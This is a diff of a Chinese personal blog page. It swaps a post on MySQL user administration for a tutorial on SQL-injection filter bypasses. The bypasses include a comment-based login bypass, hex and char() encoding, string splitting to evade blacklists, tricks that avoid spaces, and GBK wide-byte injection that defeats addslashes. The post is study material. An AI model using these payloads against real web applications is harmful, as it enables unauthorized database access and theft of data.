@@ -35,40 +35,103 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="把自己的sql语句的练级过程记录下来，以mysql数据库为例。（命令不区分大小写）    
-登录MYSQL:
+<meta name="description" content="关于引号在SQL语句中可以使用很多引号  “ 还是 ‘ 只要是成对出现后面的语句可以继续执行    mysql&amp;gt; select username”””‘’’’” from admin where id = “1”‘’;关于注释
 
-cmd&amp;gt;mysql -u root -p
-cmd&amp;gt;密码
-查看：
+可在命令行注释语句的符号
 
-MYSQL将用户信息存储在mysql.user中可以使用select命令查看user表中的数据（当前用户必须有对user的查看权限）
-mysql&amp;gt;select user,host,password fro">
+
+
+符号
+说明
+
+
+
+
+#
+hash语法
+
+
+/*
+C-sytle
+
+
+-- -
+SQL语法
+
+
+;%00
+空字节
+
+
+```
+反引号">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入练级攻略(1)-用户增删改查">
-<meta property="og:url" content="http://yoursite.com/2015/08/11/SQL注入练级攻略-1-用户增删改查/index.html">
+<meta property="og:title" content="SQL注入练级攻略(5)-基本绕过(一)">
+<meta property="og:url" content="http://yoursite.com/2015/08/17/SQL注入练级攻略-6-基本绕过-一/index.html">
 <meta property="og:site_name" content="FengGe">
-<meta property="og:description" content="把自己的sql语句的练级过程记录下来，以mysql数据库为例。（命令不区分大小写）    
-登录MYSQL:
+<meta property="og:description" content="关于引号在SQL语句中可以使用很多引号  “ 还是 ‘ 只要是成对出现后面的语句可以继续执行    mysql&amp;gt; select username”””‘’’’” from admin where id = “1”‘’;关于注释
 
-cmd&amp;gt;mysql -u root -p
-cmd&amp;gt;密码
-查看：
+可在命令行注释语句的符号
 
-MYSQL将用户信息存储在mysql.user中可以使用select命令查看user表中的数据（当前用户必须有对user的查看权限）
-mysql&amp;gt;select user,host,password fro">
-<meta property="og:updated_time" content="2015-08-14T09:53:06.352Z">
+
+
+符号
+说明
+
+
+
+
+#
+hash语法
+
+
+/*
+C-sytle
+
+
+-- -
+SQL语法
+
+
+;%00
+空字节
+
+
+```
+反引号">
+<meta property="og:updated_time" content="2015-08-17T03:36:06.412Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入练级攻略(1)-用户增删改查">
-<meta name="twitter:description" content="把自己的sql语句的练级过程记录下来，以mysql数据库为例。（命令不区分大小写）    
-登录MYSQL:
+<meta name="twitter:title" content="SQL注入练级攻略(5)-基本绕过(一)">
+<meta name="twitter:description" content="关于引号在SQL语句中可以使用很多引号  “ 还是 ‘ 只要是成对出现后面的语句可以继续执行    mysql&amp;gt; select username”””‘’’’” from admin where id = “1”‘’;关于注释
 
-cmd&amp;gt;mysql -u root -p
-cmd&amp;gt;密码
-查看：
+可在命令行注释语句的符号
 
-MYSQL将用户信息存储在mysql.user中可以使用select命令查看user表中的数据（当前用户必须有对user的查看权限）
-mysql&amp;gt;select user,host,password fro">
+
+
+符号
+说明
+
+
+
+
+#
+hash语法
+
+
+/*
+C-sytle
+
+
+-- -
+SQL语法
+
+
+;%00
+空字节
+
+
+```
+反引号">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -78,7 +141,7 @@ mysql&amp;gt;select user,host,password fro">
   };
 </script>
 
-  <title> SQL注入练级攻略(1)-用户增删改查 | FengGe </title>
+  <title> SQL注入练级攻略(5)-基本绕过(一) | FengGe </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -193,7 +256,7 @@ mysql&amp;gt;select user,host,password fro">
           
           
             
-              SQL注入练级攻略(1)-用户增删改查
+              SQL注入练级攻略(5)-基本绕过(一)
             
           
         </h1>
@@ -202,8 +265,8 @@ mysql&amp;gt;select user,host,password fro">
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-08-11T09:02:25+08:00" content="2015-08-11">
-            2015-08-11
+          <time itemprop="dateCreated" datetime="2015-08-17T10:02:47+08:00" content="2015-08-17">
+            2015-08-17
           </time>
         </span>
 
@@ -228,8 +291,8 @@ mysql&amp;gt;select user,host,password fro">
           
             <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2015/08/11/SQL注入练级攻略-1-用户增删改查/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/11/SQL注入练级攻略-1-用户增删改查/" itemprop="commentsCount"></span>
+              <a href="/2015/08/17/SQL注入练级攻略-6-基本绕过-一/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/17/SQL注入练级攻略-6-基本绕过-一/" itemprop="commentsCount"></span>
               </a>
             </span>
           
@@ -243,34 +306,63 @@ mysql&amp;gt;select user,host,password fro">
       
 
       
-        <span itemprop="articleBody"><p>把自己的sql语句的练级过程记录下来，以mysql数据库为例。<br>（命令不区分大小写）    </p>
-<h2>登录MYSQL:</h2>
+        <span itemprop="articleBody"><h2>关于引号</h2><br>在SQL语句中可以使用很多引号  “ 还是 ‘ 只要是成对出现后面的语句可以继续执行<br><br>    mysql&gt; select username”””‘’’’” from admin where id = “1”‘’;<br><br><h2>关于注释</h2>
 
-<pre><code><span class="built_ins">cmd</span>&gt;mysql -u root -p
-<span class="built_ins">cmd</span>&gt;密码
-</code></pre><h2>查看：</h2>
+<p>可在命令行注释语句的符号</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">符号</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>#</code></td>
+<td>hash语法</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>/*</code></td>
+<td>C-sytle</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-- -</code></td>
+<td>SQL语法</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>;%00</code></td>
+<td>空字节</td>
+</tr>
+<tr>
+<td style="text-align:center">```</td>
+<td>反引号</td>
+</tr>
+</tbody>
+</table>
+<pre><code>mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin <span class="keyword">where</span> username = <span class="string">"admin"</span> and password = <span class="string">'123456'</span>; <span class="comment">//正常的语句</span>
+mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin <span class="keyword">where</span> username = <span class="string">"admin"</span>;<span class="preprocessor">#" and password = '123456';//构造后的语句这样不经过and后的验证直接返回符合的id</span>
+</code></pre><h2>绕过引号</h2>
 
-<p>MYSQL将用户信息存储在mysql.user中<br>可以使用select命令<strong>查看</strong>user表中的数据（当前用户必须有对user的查看权限）</p>
-<pre><code>mysql&gt;<span class="keyword">select</span> user,host,password <span class="keyword">from</span> mysql.user;<span class="comment">//或者使用以下两个分步语句</span>
-mysql&gt;show databases;                      <span class="comment">//显示当前用户可查看的所有数据库</span>
-mysql&gt;use mysql;                           <span class="comment">//选择mysql数据库</span>
-mysql&gt;<span class="keyword">select</span> user,host,password <span class="keyword">from</span> user; <span class="comment">//从user表中查询</span>
-mysql&gt;<span class="function"><span class="keyword">select</span> <span class="title">user</span>(<span class="params"></span>)</span>;                        <span class="comment">//查看当前用户</span>
-</code></pre><h2>创建：</h2>
+<pre><code>mysql&gt; select * from user where user = <span class="number">0x61646D696E</span> ; 
+<span class="comment">// 在python解释器中 "admin".encode("hex") 显示 61646D696E</span>
+mysql&gt; select * from user where user = <span class="keyword">char</span>(<span class="number">97</span>,<span class="number">100</span>,<span class="number">109</span>,<span class="number">105</span>,<span class="number">110</span>);
+<span class="comment">// 利用char函数.</span>
+</code></pre><h2>绕过字符串黑名单</h2>
 
-<pre><code>mysql&gt;<span class="built_in">create</span> user test identified <span class="keyword">by</span> <span class="string">"123"</span><span class="comment"> //纯文本123加密存储在user表中password字段</span>
-</code></pre><h2>修改：</h2>
+<pre><code>mysql&gt; <span class="keyword">select</span> <span class="string">'a'</span><span class="string">'d'</span><span class="string">'mi'</span><span class="string">'n'</span>;
+mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat</span>(<span class="params"><span class="string">'a'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'i'</span>,<span class="string">'n'</span></span>)</span>;<span class="comment">//当有一参数为null返回null</span>
+mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat_ws</span>(<span class="params"><span class="string">''</span>,<span class="string">'a'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'i'</span>,<span class="string">'n'</span></span>)</span>;<span class="comment">// 推荐使用</span>
+mysql&gt; <span class="function">SELECT <span class="title">GROUP_CONCAT</span>(<span class="params"><span class="string">'a'</span>, <span class="string">'d'</span>, <span class="string">'m'</span>, <span class="string">'i'</span>, <span class="string">'n'</span></span>)</span>;
+</code></pre><h2>绕过空格</h2>
 
-<pre><code>mysql&gt;rename user <span class="built_in">test</span> to <span class="built_in">test</span>1;
-
-mysql&gt;<span class="built_in">set</span> password <span class="keyword">for</span> <span class="built_in">test</span> = password(<span class="string">'123'</span>)//对user表没有操作权限的用户可以用此命令修改自己的密码
-mysql&gt;update mysql.user <span class="built_in">set</span> password = password(<span class="string">'123'</span>) <span class="built_in">where</span> user = <span class="string">"test"</span> //修改任意用户密码
-</code></pre><h2>删除:</h2>
-
-<pre><code>mysql&gt;drop <span class="keyword">user</span> test;  //删除名为test的<span class="keyword">user</span>
-
-mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span> = <span class="string">"test"</span> //不知道和上面的有什么区别
-</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+<pre><code>mysql&gt; /<span class="keyword">*</span>!select/<span class="keyword">*</span>!1/<span class="keyword">*</span>!<span class="keyword">*</span>/
+// /<span class="keyword">*</span>! SQL 语句 <span class="keyword">*</span>/ mysql特有语句，前面不管几个/<span class="keyword">*</span>!  语句需以<span class="keyword">*</span>/结尾.
+mysql&gt; select(1);
+//括号用来绕过过滤空格的情况.
+</code></pre><p></p><h2>and或or后面可以跟的字符</h2><br>|符号|<br>|:–:|<br>|Space|<br>|+|<br>|-|<br>|~|<br>|!|<br>|@|<p></p>
+<pre><code>mysql&gt; SELECT <span class="number">1</span> FROM dual WHERE <span class="number">1</span>=<span class="number">1</span> AND-+-+-+-+~~((<span class="number">1</span>));
+</code></pre><p></p><h2>宽字节注入</h2><br>sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。<p></p>
+<p><a href="http://drops.wooyun.org/tips/123" target="_blank" rel="external">摘自乌云知识库</a></p>
 </span>
       
     </div>
@@ -290,13 +382,11 @@ mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">us
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/08/11/SQL注入练级攻略-2-权限分配/" rel="prev">SQL注入练级攻略(2)-权限分配</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/08/10/loadrunner问题记录/" rel="next">loadrunner问题记录</a>
+              <a href="/2015/08/14/阿里郎的情书/" rel="next">阿里郎的情书</a>
             
           </div>
         </div>
@@ -321,8 +411,8 @@ mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">us
         
           <div class="comments" id="comments">
             
-              <div class="ds-thread" data-thread-key="2015/08/11/SQL注入练级攻略-1-用户增删改查/"
-                   data-title="SQL注入练级攻略(1)-用户增删改查" data-url="http://yoursite.com/2015/08/11/SQL注入练级攻略-1-用户增删改查/">
+              <div class="ds-thread" data-thread-key="2015/08/17/SQL注入练级攻略-6-基本绕过-一/"
+                   data-title="SQL注入练级攻略(5)-基本绕过(一)" data-url="http://yoursite.com/2015/08/17/SQL注入练级攻略-6-基本绕过-一/">
               </div>
             
           </div>
@@ -429,7 +519,7 @@ mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">us
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">登录MYSQL:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">查看：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">创建：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">修改：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">5.</span> <span class="nav-text">删除:</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">关于引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">关于注释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">绕过引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">4.</span> <span class="nav-text">绕过字符串黑名单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">5.</span> <span class="nav-text">绕过空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">6.</span> <span class="nav-text">and或or后面可以跟的字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">7.</span> <span class="nav-text">宽字节注入</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
